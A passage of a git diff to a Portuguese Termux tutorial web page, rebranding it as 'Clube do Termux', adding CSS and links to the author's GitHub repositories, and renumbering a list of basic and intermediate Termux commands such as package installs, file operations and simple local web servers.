@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TERMUX 200+ TUTORIAIS · Do Básico ao Avançado</title>
+  <title>CLUBE DO TERMUX · 250+ Tutoriais do Básico ao Avançado</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -22,6 +22,7 @@
       --text-secondary: #8da6c0;
       --text-muted: #4d6a8a;
       --accent-blue: #3d7eff;
+      --gold: #ffd700;
     }
 
     html { scroll-behavior: smooth; }
@@ -39,7 +40,6 @@
     ::-webkit-scrollbar-track { background: var(--bg-primary); }
     ::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 10px; }
 
-    /* ===== ANIMATED GRID ===== */
     .grid-bg {
       position: fixed; inset: 0;
       background-image:
@@ -54,7 +54,6 @@
       50% { opacity: 0.8; }
     }
 
-    /* ===== PARTICLES ===== */
     .particles {
       position: fixed; inset: 0; z-index: 0;
       pointer-events: none; overflow: hidden;
@@ -75,14 +74,12 @@
       100% { opacity: 0; transform: translateY(-10vh) scale(1); }
     }
 
-    /* ===== CONTAINER ===== */
     .container {
       position: relative; z-index: 10;
       max-width: 1200px; margin: 0 auto;
       padding: 1.5rem;
     }
 
-    /* ===== HEADER ===== */
     .hero {
       text-align: center;
       padding: 3rem 1rem 2rem;
@@ -122,6 +119,21 @@
       50% { opacity: 0.2; }
     }
 
+    .hero .logo-clube {
+      font-size: clamp(1.2rem, 3vw, 1.8rem);
+      font-weight: 700;
+      color: var(--gold);
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      margin-bottom: 0.3rem;
+      text-shadow: 0 0 20px rgba(255,215,0,0.2);
+      animation: fadeInDown 0.6s ease;
+    }
+    .hero .logo-clube i {
+      color: var(--neon);
+      margin: 0 8px;
+    }
+
     .hero h1 {
       font-size: clamp(1.8rem, 5vw, 3.2rem);
       font-weight: 800;
@@ -158,6 +170,30 @@
       text-transform: uppercase; letter-spacing: 0.1em;
     }
 
+    .hero .social-repos {
+      display: flex; justify-content: center; gap: 0.8rem;
+      margin-top: 1.2rem;
+      flex-wrap: wrap;
+      animation: fadeInUp 1.4s ease;
+    }
+    .hero .social-repos a {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: var(--bg-card2);
+      border: 1px solid var(--border);
+      padding: 0.3rem 1rem;
+      border-radius: 30px;
+      color: var(--text-secondary);
+      text-decoration: none;
+      font-size: 0.65rem;
+      transition: all 0.3s;
+    }
+    .hero .social-repos a:hover {
+      border-color: var(--neon);
+      color: var(--neon-dim);
+      transform: translateY(-2px);
+    }
+    .hero .social-repos a i { color: var(--neon-dim); }
+
     @keyframes fadeInUp {
       0% { opacity: 0; transform: translateY(20px); }
       100% { opacity: 1; transform: translateY(0); }
@@ -167,7 +203,6 @@
       100% { opacity: 1; transform: translateY(0); }
     }
 
-    /* ===== SEARCH & FILTER ===== */
     .search-section {
       margin: 2rem 0 1.5rem;
       display: flex;
@@ -246,7 +281,6 @@
       width: 100%;
     }
 
-    /* ===== CATEGORY SECTIONS ===== */
     .category {
       margin: 2.5rem 0;
       animation: fadeInUp 0.8s ease;
@@ -271,6 +305,7 @@
       display: flex; align-items: center; justify-content: center;
       color: var(--neon-dim);
       font-size: 1rem;
+      flex-shrink: 0;
     }
     .category-header h2 {
       font-size: 1rem; font-weight: 700;
@@ -283,6 +318,7 @@
       background: var(--bg-card2);
       padding: 0.2rem 0.8rem;
       border-radius: 30px;
+      white-space: nowrap;
     }
     .category-header .toggle-icon {
       color: var(--text-muted);
@@ -293,7 +329,6 @@
       transform: rotate(-90deg);
     }
 
-    /* ===== TUTORIAL GRID ===== */
     .tutorial-grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
@@ -302,7 +337,6 @@
     }
     .category.collapsed .tutorial-grid { display: none; }
 
-    /* ===== TUTORIAL CARD ===== */
     .tutorial-card {
       background: var(--bg-card);
       border: 1px solid var(--border);
@@ -326,9 +360,7 @@
       transform: translateY(-3px);
       box-shadow: 0 8px 30px rgba(0,255,200,0.08);
     }
-    .tutorial-card:hover::before {
-      opacity: 1;
-    }
+    .tutorial-card:hover::before { opacity: 1; }
     .tutorial-card .num {
       font-size: 0.6rem;
       color: var(--text-muted);
@@ -381,6 +413,17 @@
       border-color: rgba(0,255,200,0.2);
     }
 
+    .tutorial-card .repo-badge {
+      display: inline-flex; align-items: center; gap: 4px;
+      font-size: 0.5rem;
+      background: rgba(255,215,0,0.1);
+      color: var(--gold);
+      padding: 0.1rem 0.5rem;
+      border-radius: 20px;
+      border: 1px solid rgba(255,215,0,0.2);
+      margin-top: 0.3rem;
+    }
+
     .tutorial-card .copy-btn {
       position: absolute; top: 0.6rem; right: 0.6rem;
       background: transparent; border: none;
@@ -391,18 +434,13 @@
       transition: all 0.2s;
       opacity: 0;
     }
-    .tutorial-card:hover .copy-btn {
-      opacity: 1;
-    }
+    .tutorial-card:hover .copy-btn { opacity: 1; }
     .tutorial-card .copy-btn:hover {
       color: var(--neon-dim);
       background: rgba(0,255,200,0.1);
     }
-    .tutorial-card .copy-btn.copied {
-      color: #00ff88;
-    }
+    .tutorial-card .copy-btn.copied { color: #00ff88; }
 
-    /* ===== TERMINAL OUTPUT MODAL ===== */
     .modal-overlay {
       position: fixed; inset: 0;
       background: rgba(0,0,0,0.85);
@@ -458,9 +496,7 @@
     }
     .modal-close:hover { color: var(--neon-dim); }
 
-    .modal-body {
-      padding: 1.5rem;
-    }
+    .modal-body { padding: 1.5rem; }
     .modal-body .modal-desc {
       color: var(--text-secondary);
       font-size: 0.8rem;
@@ -495,6 +531,22 @@
       color: var(--neon-dim);
       background: rgba(0,255,200,0.1);
     }
+    .modal-body .modal-repo-link {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 0.65rem;
+      color: var(--gold);
+      background: rgba(255,215,0,0.06);
+      border: 1px solid rgba(255,215,0,0.2);
+      padding: 0.3rem 0.8rem;
+      border-radius: 20px;
+      margin-bottom: 1rem;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .modal-body .modal-repo-link:hover {
+      background: rgba(255,215,0,0.12);
+      border-color: var(--gold);
+    }
 
     .modal-output {
       background: #05080e;
@@ -505,14 +557,9 @@
       border: 1px solid var(--border);
       line-height: 1.8;
     }
-    .modal-output .prompt-symbol {
-      color: var(--neon-dim);
-    }
-    .modal-output .output-text {
-      color: #7a9abb;
-    }
+    .modal-output .prompt-symbol { color: var(--neon-dim); }
+    .modal-output .output-text { color: #7a9abb; }
 
-    /* ===== QUICK NAV ===== */
     .quick-nav {
       position: fixed; right: 1rem; top: 50%;
       transform: translateY(-50%);
@@ -535,7 +582,44 @@
       transform: scale(1.3);
     }
 
-    /* ===== FOOTER ===== */
+    .repo-section-banner {
+      background: linear-gradient(135deg, rgba(255,215,0,0.05), rgba(0,255,200,0.05));
+      border: 1px solid rgba(255,215,0,0.15);
+      border-radius: 16px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+      text-align: center;
+    }
+    .repo-section-banner h3 {
+      color: var(--gold);
+      font-size: 0.9rem;
+      margin-bottom: 0.5rem;
+    }
+    .repo-section-banner p {
+      color: var(--text-secondary);
+      font-size: 0.75rem;
+    }
+    .repo-section-banner .repo-links {
+      display: flex; justify-content: center; gap: 0.8rem;
+      margin-top: 0.8rem;
+      flex-wrap: wrap;
+    }
+    .repo-section-banner .repo-links a {
+      display: inline-flex; align-items: center; gap: 5px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      padding: 0.3rem 1rem;
+      border-radius: 30px;
+      color: var(--text-secondary);
+      text-decoration: none;
+      font-size: 0.6rem;
+      transition: all 0.3s;
+    }
+    .repo-section-banner .repo-links a:hover {
+      border-color: var(--gold);
+      color: var(--gold);
+    }
+
     .footer {
       text-align: center;
       padding: 3rem 1rem 2rem;
@@ -559,8 +643,10 @@
       font-size: 0.65rem;
       color: var(--text-muted);
     }
+    .footer .highlight {
+      color: var(--gold);
+    }
 
-    /* ===== RESPONSIVE ===== */
     @media (max-width: 768px) {
       .tutorial-grid { grid-template-columns: 1fr; }
       .search-section { flex-direction: column; }
@@ -574,7 +660,6 @@
       .filter-btn { font-size: 0.6rem; padding: 0.4rem 0.8rem; }
     }
 
-    /* ===== NO RESULTS ===== */
     .no-results {
       text-align: center;
       padding: 3rem;
@@ -588,34 +673,40 @@
 <body>
 
 <div class="grid-bg"></div>
-
 <div class="particles" id="particles"></div>
 
-<!-- Quick Nav -->
 <nav class="quick-nav" id="quickNav"></nav>
 
 <div class="container">
 
-  <!-- HERO -->
   <header class="hero">
     <div class="hero-badge">
       <span class="live-dot"></span>
-      <span>200+ TUTORIAIS · DO BÁSICO AO AVANÇADO</span>
+      <span>COMUNIDADE · OPEN SOURCE</span>
     </div>
-    <h1>🐚 TERMUX PRO</h1>
-    <p>O guia definitivo de comandos e tutoriais Termux — do iniciante ao hacker ético</p>
+    <div class="logo-clube">
+      <i class="fas fa-terminal"></i> CLUBE DO TERMUX <i class="fas fa-skull"></i>
+    </div>
+    <h1>🐚 250+ TUTORIAIS</h1>
+    <p>Do básico ao avançado — O guia definitivo de comandos e ferramentas para Termux</p>
     <div class="hero-stats">
-      <div class="stat"><span class="num" id="totalTuts">200+</span><span class="lbl">Tutoriais</span></div>
-      <div class="stat"><span class="num">6</span><span class="lbl">Categorias</span></div>
-      <div class="stat"><span class="num">100%</span><span class="lbl">Open Source</span></div>
+      <div class="stat"><span class="num" id="totalTuts">250+</span><span class="lbl">Tutoriais</span></div>
+      <div class="stat"><span class="num">12</span><span class="lbl">Categorias</span></div>
+      <div class="stat"><span class="num">10+</span><span class="lbl">Repositórios</span></div>
+    </div>
+    <div class="social-repos">
+      <a href="https://github.com/carlos46743/clube-do-termux" target="_blank"><i class="fab fa-github"></i> clube-do-termux</a>
+      <a href="https://github.com/carlos46743/termux-prompt-installer" target="_blank"><i class="fas fa-paint-brush"></i> prompt-installer</a>
+      <a href="https://github.com/carlos46743/mini-llm-termux" target="_blank"><i class="fas fa-brain"></i> mini-llm</a>
+      <a href="https://github.com/carlos46743/cybertrace-panel" target="_blank"><i class="fas fa-search"></i> cybertrace</a>
+      <a href="https://github.com/carlos46743/ALHacking" target="_blank"><i class="fas fa-skull"></i> ALHacking</a>
     </div>
   </header>
 
-  <!-- SEARCH -->
   <div class="search-section">
     <div class="search-box">
       <i class="fas fa-search"></i>
-      <input type="text" id="searchInput" placeholder="Buscar tutorial... (ex: python, nmap, ssh)">
+      <input type="text" id="searchInput" placeholder="Buscar tutorial... (ex: python, nmap, ssh, prompt)">
       <button class="clear-btn" id="clearBtn"><i class="fas fa-times"></i></button>
     </div>
     <div class="filter-group" id="filterGroup">
@@ -627,30 +718,39 @@
     <div class="result-count" id="resultCount">Mostrando todos os tutoriais</div>
   </div>
 
-  <!-- TUTORIALS -->
-  <div id="tutorialsContainer"></div>
-
-  <!-- NO RESULTS -->
-  <div class="no-results" id="noResults">
-    <i class="fas fa-search-minus"></i>
-    <p>Nenhum tutorial encontrado 😕</p>
-    <p style="font-size:0.7rem;margin-top:0.3rem;">Tente outros termos como "python", "nmap", "ssh"</p>
+  <div class="repo-section-banner">
+    <h3><i class="fas fa-code-branch"></i> REPOSITÓRIOS OFICIAIS DO CLUBE</h3>
+    <p>Tutoriais baseados em projetos reais da comunidade — prompt personalizado, mini IA, painel de investigação, hacking tools e mais</p>
+    <div class="repo-links">
+      <a href="https://github.com/carlos46743/termux-prompt-installer" target="_blank"><i class="fas fa-paint-brush"></i> Prompt Installer</a>
+      <a href="https://github.com/carlos46743/mini-llm-termux" target="_blank"><i class="fas fa-brain"></i> Mini LLM</a>
+      <a href="https://github.com/carlos46743/cybertrace-panel" target="_blank"><i class="fas fa-search"></i> CyberTrace Panel</a>
+      <a href="https://github.com/carlos46743/ALHacking" target="_blank"><i class="fas fa-skull"></i> ALHacking</a>
+      <a href="https://github.com/carlos46743/Banner-Termux-" target="_blank"><i class="fas fa-image"></i> Banner Termux</a>
+      <a href="https://github.com/carlos46743/clube-do-termux" target="_blank"><i class="fab fa-github"></i> Clube do Termux</a>
+    </div>
   </div>
 
-  <!-- FOOTER -->
+  <div id="tutorialsContainer"></div>
+
+  <div class="no-results" id="noResults">
+    <i class="fas fa-search-minus"></i>
+    <p>Nenhum tutorial encontrado</p>
+    <p style="font-size:0.7rem;margin-top:0.3rem;">Tente outros termos como "python", "nmap", "ssh", "prompt"</p>
+  </div>
+
   <footer class="footer">
     <div class="social-links">
-      <a href="https://github.com" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      <a href="https://github.com/carlos46743" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      <a href="https://github.com/carlos46743/clube-do-termux" target="_blank" title="Clube do Termux"><i class="fas fa-terminal"></i></a>
       <a href="#" title="Telegram"><i class="fab fa-telegram"></i></a>
       <a href="#" title="YouTube"><i class="fab fa-youtube"></i></a>
-      <a href="#" title="Discord"><i class="fab fa-discord"></i></a>
     </div>
-    <p>TERMUX TUTORIAIS · COMPILADO COM 💚 PELA COMUNIDADE · CMD+POWERED</p>
-    <p style="margin-top:0.3rem">Linux is NOT a virus, it's the cure.</p>
+    <p><span class="highlight">CLUBE DO TERMUX</span> · COMPILADO COM 💚 PELA COMUNIDADE</p>
+    <p style="margin-top:0.3rem">Aprenda tecnologia pelo celular · github.com/carlos46743</p>
   </footer>
 </div>
 
-<!-- MODAL -->
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal">
     <div class="modal-header">
@@ -659,6 +759,9 @@
     </div>
     <div class="modal-body">
       <div class="modal-desc" id="modalDesc"></div>
+      <a class="modal-repo-link" id="modalRepoLink" href="#" target="_blank" style="display:none">
+        <i class="fab fa-github"></i> <span id="modalRepoName">Ver repositório</span>
+      </a>
       <div class="modal-cmd">
         <button class="copy-cmd-btn" id="modalCopyBtn"><i class="fas fa-copy"></i> Copiar</button>
         <pre id="modalCmd"></pre>
@@ -669,9 +772,10 @@
 </div>
 
 <script>
-  // ===== TUTORIALS DATABASE =====
   const tutorials = [
-    // ===== BÁSICO =====
+    // =============================================
+    // BÁSICO
+    // =============================================
     { id: 1,  cmd: "pkg update && pkg upgrade",            desc: "Atualizar todos os pacotes do Termux. Essencial antes de instalar qualquer coisa.", level: "basico", cat: "iniciante", tags: ["pkg", "update", "sistema"] },
     { id: 2,  cmd: "pkg install git",                      desc: "Instalar Git para clonar repositórios e versionar código.", level: "basico", cat: "iniciante", tags: ["git", "pkg", "install"] },
     { id: 3,  cmd: "pkg install python",                   desc: "Instalar Python 3 no Termux para scripts e automação.", level: "basico", cat: "iniciante", tags: ["python", "pkg"] },
@@ -697,224 +801,219 @@
     { id: 23, cmd: "yt-dlp 'URL'",                        desc: "yt-dlp — fork melhorado do youtube-dl para downloads rápidos.", level: "basico", cat: "midia", tags: ["yt-dlp", "youtube"] },
     { id: 24, cmd: "pkg install termux-api",               desc: "API Termux para acessar sensores do celular (câmera, GPS, etc).", level: "basico", cat: "api", tags: ["termux-api", "sensores"] },
     { id: 25, cmd: "termux-wifi-scaninfo",                 desc: "Escaneie redes Wi-Fi ao redor com o Termux API.", level: "basico", cat: "api", tags: ["wifi", "scan"] },
-    { id: 26, cmd: "termux-sensor -s \"Accelerometer\" -n 1", desc: "Ler dados do acelerômetro do celular.", level: "basico", cat: "api", tags: ["sensor", "acelerometro"] },
-    { id: 27, cmd: "termux-camera-photo /sdcard/foto.jpg", desc: "Tirar foto usando a câmera via terminal.", level: "basico", cat: "api", tags: ["camera", "foto"] },
-    { id: 28, cmd: "termux-location",                      desc: "Obter coordenadas GPS atuais do dispositivo.", level: "basico", cat: "api", tags: ["gps", "localizacao"] },
-    { id: 29, cmd: "termux-battery-status",                desc: "Ver status da bateria (percentual, temperatura, etc).", level: "basico", cat: "api", tags: ["bateria", "status"] },
-    { id: 30, cmd: "termux-notification --title \"Oi\" --content \"Mundo\"", desc: "Enviar notificação push do terminal.", level: "basico", cat: "api", tags: ["notificacao", "push"] },
-    { id: 31, cmd: "pkg install sl",                       desc: "SL — um trem atravessa a tela quando você erra 'ls'. Easter egg.", level: "basico", cat: "diversao", tags: ["sl", "easter-egg"] },
-    { id: 32, cmd: "pkg install cmatrix",                  desc: "Cmatrix — efeito Matrix de chuva de códigos verdes.", level: "basico", cat: "diversao", tags: ["cmatrix", "matrix"] },
-    { id: 33, cmd: "pkg install cowsay",                   desc: "Cowsay — uma vaca fala o que você digitar. Divertido.", level: "basico", cat: "diversao", tags: ["cowsay", "ascii"] },
-    { id: 34, cmd: "pkg install fortune",                  desc: "Fortune — exibe mensagens aleatórias e citações.", level: "basico", cat: "diversao", tags: ["fortune", "citacoes"] },
-    { id: 35, cmd: "pkg install figlet",                   desc: "Figlet — gerar textos em ASCII art gigantes.", level: "basico", cat: "diversao", tags: ["figlet", "ascii"] },
-    { id: 36, cmd: "pkg install toilet",                   desc: "Toilet — similar ao figlet com cores e efeitos.", level: "basico", cat: "diversao", tags: ["toilet", "ascii"] },
-    { id: 37, cmd: "pkg install lolcat",                   desc: "Lolcat — colorir outputs com efeito arco-íris.", level: "basico", cat: "diversao", tags: ["lolcat", "colorir"] },
-    { id: 38, cmd: "pkg install nyancat",                  desc: "Nyancat — o gato nyan animado no terminal.", level: "basico", cat: "diversao", tags: ["nyancat", "animacao"] },
-    { id: 39, cmd: "pkg install pipes.sh",                 desc: "Pipes — animação de tubos 3D no terminal.", level: "basico", cat: "diversao", tags: ["pipes", "animacao"] },
-    { id: 40, cmd: "pkg install asciiquarium",             desc: "Aquário com peixes animados em ASCII.", level: "basico", cat: "diversao", tags: ["asciiquarium", "aquario"] },
-    { id: 41, cmd: "pkg install bpytop",                   desc: "Bpytop — monitor de sistema com visual moderno e colorido.", level: "basico", cat: "sistema", tags: ["bpytop", "monitor"] },
-    { id: 42, cmd: "pkg install du-dust",                  desc: "Dust — versão mais intuitiva do 'du' para ver espaço em disco.", level: "basico", cat: "sistema", tags: ["dust", "disco"] },
-    { id: 43, cmd: "pkg install fd",                       desc: "Fd — alternativa rápida e amigável ao 'find'.", level: "basico", cat: "sistema", tags: ["fd", "find"] },
-    { id: 44, cmd: "pkg install bat",                      desc: "Bat — cat melhorado com syntax highlighting e Git.", level: "basico", cat: "sistema", tags: ["bat", "cat"] },
-    { id: 45, cmd: "pkg install ripgrep",                  desc: "Ripgrep (rg) — grep extremamente rápido para buscar texto.", level: "basico", cat: "sistema", tags: ["ripgrep", "rg", "grep"] },
-    { id: 46, cmd: "ls -la",                               desc: "Listar arquivos com detalhes (permissões, tamanho, owner).", level: "basico", cat: "iniciante", tags: ["ls", "listar"] },
-    { id: 47, cmd: "cd /sdcard && ls",                     desc: "Acessar o armazenamento interno do Android.", level: "basico", cat: "iniciante", tags: ["cd", "sdcard"] },
-    { id: 48, cmd: "mkdir projetos && cd projetos",        desc: "Criar e entrar em uma pasta chamada 'projetos'.", level: "basico", cat: "iniciante", tags: ["mkdir", "pasta"] },
-    { id: 49, cmd: "rm -rf pasta",                         desc: "Remover pasta e todo conteúdo (cuidado ao usar!).", level: "basico", cat: "iniciante", tags: ["rm", "remover"] },
-    { id: 50, cmd: "cp arquivo.txt backup/",               desc: "Copiar arquivo para pasta de backup.", level: "basico", cat: "iniciante", tags: ["cp", "copiar"] },
-    { id: 51, cmd: "mv arquivo.txt ~/documentos/",         desc: "Mover arquivo para a pasta documentos.", level: "basico", cat: "iniciante", tags: ["mv", "mover"] },
-    { id: 52, cmd: "cat arquivo.txt",                      desc: "Exibir conteúdo do arquivo no terminal.", level: "basico", cat: "iniciante", tags: ["cat", "visualizar"] },
-    { id: 53, cmd: "pkg search python",                    desc: "Buscar pacotes relacionados a Python nos repositórios.", level: "basico", cat: "iniciante", tags: ["pkg", "search"] },
-    { id: 54, cmd: "pkg list-installed",                   desc: "Listar todos os pacotes instalados no Termux.", level: "basico", cat: "iniciante", tags: ["pkg", "listar"] },
-    { id: 55, cmd: "pkg uninstall firefox",                desc: "Desinstalar um pacote específico.", level: "basico", cat: "iniciante", tags: ["pkg", "uninstall"] },
-    { id: 56, cmd: "pkg autoclean",                        desc: "Limpar cache de pacotes baixados.", level: "basico", cat: "iniciante", tags: ["pkg", "clean", "cache"] },
-    { id: 57, cmd: "termux-setup-storage",                  desc: "Permitir acesso do Termux ao armazenamento do celular.", level: "basico", cat: "iniciante", tags: ["storage", "setup"] },
-    { id: 58, cmd: "whoami",                               desc: "Exibir o nome do usuário atual.", level: "basico", cat: "iniciante", tags: ["whoami"] },
-    { id: 59, cmd: "pwd",                                  desc: "Mostrar o diretório atual (Print Working Directory).", level: "basico", cat: "iniciante", tags: ["pwd"] },
-    { id: 60, cmd: "echo $HOME",                           desc: "Exibir o caminho da home directory.", level: "basico", cat: "iniciante", tags: ["echo", "home"] },
-    { id: 61, cmd: "date",                                 desc: "Exibir data e hora atuais do sistema.", level: "basico", cat: "iniciante", tags: ["date"] },
-    { id: 62, cmd: "uname -a",                             desc: "Exibir informações completas do kernel Linux.", level: "basico", cat: "iniciante", tags: ["uname", "kernel"] },
-    { id: 63, cmd: "free -h",                              desc: "Mostrar uso de memória RAM em formato legível.", level: "basico", cat: "sistema", tags: ["free", "memoria"] },
-    { id: 64, cmd: "df -h",                                desc: "Mostrar espaço em disco das partições montadas.", level: "basico", cat: "sistema", tags: ["df", "disco"] },
-    { id: 65, cmd: "pkg install which",                    desc: "Which mostra o caminho completo de um comando.", level: "basico", cat: "iniciante", tags: ["which"] },
-    { id: 66, cmd: "pkg install man",                      desc: "Man — manual de comandos para consultar documentação.", level: "basico", cat: "iniciante", tags: ["man", "manual"] },
-    { id: 67, cmd: "man ls",                               desc: "Abrir manual do comando 'ls' com todas as opções.", level: "basico", cat: "iniciante", tags: ["man"] },
-    { id: 68, cmd: "pkg install less",                     desc: "Less — visualizador de arquivos com scroll.", level: "basico", cat: "iniciante", tags: ["less"] },
-    { id: 69, cmd: "pkg install head",                     desc: "Head — exibir primeiras linhas de um arquivo.", level: "basico", cat: "iniciante", tags: ["head"] },
-    { id: 70, cmd: "tail -f log.txt",                      desc: "Tail -f — monitorar arquivo em tempo real.", level: "basico", cat: "iniciante", tags: ["tail"] },
-    { id: 71, cmd: "pkg install jq",                       desc: "Jq — processar e filtrar JSON no terminal.", level: "basico", cat: "sistema", tags: ["jq", "json"] },
-    { id: 72, cmd: "pkg install tmux",                     desc: "Tmux — multiplexador de terminais (várias abas).", level: "basico", cat: "sistema", tags: ["tmux", "multiplex"] },
-    { id: 73, cmd: "pkg install screen",                   desc: "Screen — mantém sessão ativa mesmo se fechar o terminal.", level: "basico", cat: "sistema", tags: ["screen"] },
-    { id: 74, cmd: "pkg install ranger",                   desc: "Ranger — gerenciador de arquivos em terminal com Vim keys.", level: "basico", cat: "sistema", tags: ["ranger", "files"] },
-    { id: 75, cmd: "pkg install mc",                       desc: "Midnight Commander — gerenciador com duas telas.", level: "basico", cat: "sistema", tags: ["mc", "commander"] },
+    { id: 26, cmd: "termux-camera-photo /sdcard/foto.jpg", desc: "Tirar foto usando a câmera via terminal.", level: "basico", cat: "api", tags: ["camera", "foto"] },
+    { id: 27, cmd: "termux-battery-status",                desc: "Ver status da bateria (percentual, temperatura, etc).", level: "basico", cat: "api", tags: ["bateria", "status"] },
+    { id: 28, cmd: "pkg install sl",                       desc: "SL — um trem atravessa a tela quando você erra 'ls'. Easter egg.", level: "basico", cat: "diversao", tags: ["sl", "easter-egg"] },
+    { id: 29, cmd: "pkg install cmatrix",                  desc: "Cmatrix — efeito Matrix de chuva de códigos verdes.", level: "basico", cat: "diversao", tags: ["cmatrix", "matrix"] },
+    { id: 30, cmd: "pkg install cowsay",                   desc: "Cowsay — uma vaca fala o que você digitar. Divertido.", level: "basico", cat: "diversao", tags: ["cowsay", "ascii"] },
+    { id: 31, cmd: "pkg install figlet",                   desc: "Figlet — gerar textos em ASCII art gigantes.", level: "basico", cat: "diversao", tags: ["figlet", "ascii"] },
+    { id: 32, cmd: "pkg install lolcat",                   desc: "Lolcat — colorir outputs com efeito arco-íris.", level: "basico", cat: "diversao", tags: ["lolcat", "colorir"] },
+    { id: 33, cmd: "termux-setup-storage",                  desc: "Permitir acesso do Termux ao armazenamento do celular.", level: "basico", cat: "iniciante", tags: ["storage", "setup"] },
+    { id: 34, cmd: "ls -la",                               desc: "Listar arquivos com detalhes (permissões, tamanho, owner).", level: "basico", cat: "iniciante", tags: ["ls", "listar"] },
+    { id: 35, cmd: "cd /sdcard && ls",                     desc: "Acessar o armazenamento interno do Android.", level: "basico", cat: "iniciante", tags: ["cd", "sdcard"] },
+    { id: 36, cmd: "mkdir projetos && cd projetos",        desc: "Criar e entrar em uma pasta chamada 'projetos'.", level: "basico", cat: "iniciante", tags: ["mkdir", "pasta"] },
+    { id: 37, cmd: "rm -rf pasta",                         desc: "Remover pasta e todo conteúdo (cuidado ao usar!).", level: "basico", cat: "iniciante", tags: ["rm", "remover"] },
+    { id: 38, cmd: "cat arquivo.txt",                      desc: "Exibir conteúdo do arquivo no terminal.", level: "basico", cat: "iniciante", tags: ["cat", "visualizar"] },
+    { id: 39, cmd: "pkg search python",                    desc: "Buscar pacotes relacionados a Python nos repositórios.", level: "basico", cat: "iniciante", tags: ["pkg", "search"] },
+    { id: 40, cmd: "pkg list-installed",                   desc: "Listar todos os pacotes instalados no Termux.", level: "basico", cat: "iniciante", tags: ["pkg", "listar"] },
+    { id: 41, cmd: "pkg autoclean",                        desc: "Limpar cache de pacotes baixados.", level: "basico", cat: "iniciante", tags: ["pkg", "clean", "cache"] },
+    { id: 42, cmd: "whoami",                               desc: "Exibir o nome do usuário atual.", level: "basico", cat: "iniciante", tags: ["whoami"] },
+    { id: 43, cmd: "pwd",                                  desc: "Mostrar o diretório atual (Print Working Directory).", level: "basico", cat: "iniciante", tags: ["pwd"] },
+    { id: 44, cmd: "echo $HOME",                           desc: "Exibir o caminho da home directory.", level: "basico", cat: "iniciante", tags: ["echo", "home"] },
+    { id: 45, cmd: "date",                                 desc: "Exibir data e hora atuais do sistema.", level: "basico", cat: "iniciante", tags: ["date"] },
+    { id: 46, cmd: "uname -a",                             desc: "Exibir informações completas do kernel Linux.", level: "basico", cat: "iniciante", tags: ["uname", "kernel"] },
+    { id: 47, cmd: "free -h",                              desc: "Mostrar uso de memória RAM em formato legível.", level: "basico", cat: "iniciante", tags: ["free", "memoria"] },
+    { id: 48, cmd: "df -h",                                desc: "Mostrar espaço em disco das partições montadas.", level: "basico", cat: "iniciante", tags: ["df", "disco"] },
+    { id: 49, cmd: "pkg install which",                    desc: "Which mostra o caminho completo de um comando.", level: "basico", cat: "iniciante", tags: ["which"] },
+    { id: 50, cmd: "tail -f log.txt",                      desc: "Tail -f — monitorar arquivo em tempo real.", level: "basico", cat: "iniciante", tags: ["tail"] },
+    { id: 51, cmd: "pkg install jq",                       desc: "Jq — processar e filtrar JSON no terminal.", level: "basico", cat: "iniciante", tags: ["jq", "json"] },
+    { id: 52, cmd: "pkg install tmux",                     desc: "Tmux — multiplexador de terminais (várias abas).", level: "basico", cat: "iniciante", tags: ["tmux", "multiplex"] },
+    { id: 53, cmd: "pkg install ranger",                   desc: "Ranger — gerenciador de arquivos em terminal com Vim keys.", level: "basico", cat: "iniciante", tags: ["ranger", "files"] },
+    { id: 54, cmd: "pkg install mc",                       desc: "Midnight Commander — gerenciador com duas telas.", level: "basico", cat: "iniciante", tags: ["mc", "commander"] },
+    { id: 55, cmd: "pkg install fzf",                      desc: "Fzf — fuzzy finder para busca rápida no terminal.", level: "basico", cat: "iniciante", tags: ["fzf", "busca"] },
 
-    // ===== INTERMEDIÁRIO =====
-    { id: 76, cmd: "pkg install python && pip install flask", desc: "Instalar Flask — framework web Python para APIs e sites.", level: "intermediario", cat: "web", tags: ["flask", "python", "web"] },
-    { id: 77, cmd: "pkg install python && pip install django", desc: "Instalar Django — framework web completo Python.", level: "intermediario", cat: "web", tags: ["django", "python"] },
-    { id: 78, cmd: "pkg install nginx",                    desc: "Nginx — servidor web reverso e proxy.", level: "intermediario", cat: "web", tags: ["nginx", "servidor"] },
-    { id: 79, cmd: "pkg install apache2",                  desc: "Apache2 — servidor web clássico e robusto.", level: "intermediario", cat: "web", tags: ["apache", "servidor"] },
-    { id: 80, cmd: "pkg install php",                      desc: "PHP — linguagem server-side para web dinâmica.", level: "intermediario", cat: "web", tags: ["php", "web"] },
-    { id: 81, cmd: "pkg install php mariadb",              desc: "PHP + MariaDB — stack básico para sites dinâmicos.", level: "intermediario", cat: "web", tags: ["php", "mariadb", "banco"] },
-    { id: 82, cmd: "php -S 0.0.0.0:8080",                  desc: "Servidor PHP embutido rodando na porta 8080.", level: "intermediario", cat: "web", tags: ["php", "server"] },
-    { id: 83, cmd: "pkg install nodejs && npm init -y",    desc: "Iniciar projeto Node.js com package.json.", level: "intermediario", cat: "web", tags: ["nodejs", "npm"] },
-    { id: 84, cmd: "npm install express",                  desc: "ExpressJS — framework web para Node.js.", level: "intermediario", cat: "web", tags: ["express", "nodejs"] },
-    { id: 85, cmd: "npm install -g http-server",           desc: "Servidor HTTP instantâneo para pastas estáticas.", level: "intermediario", cat: "web", tags: ["http-server", "statico"] },
-    { id: 86, cmd: "python -m http.server 8080",           desc: "Servidor HTTP Python simples para compartilhar arquivos.", level: "intermediario", cat: "web", tags: ["python", "http"] },
-    { id: 87, cmd: "curl ifconfig.me",                     desc: "Descobrir seu IP público externo.", level: "intermediario", cat: "web", tags: ["curl", "ip"] },
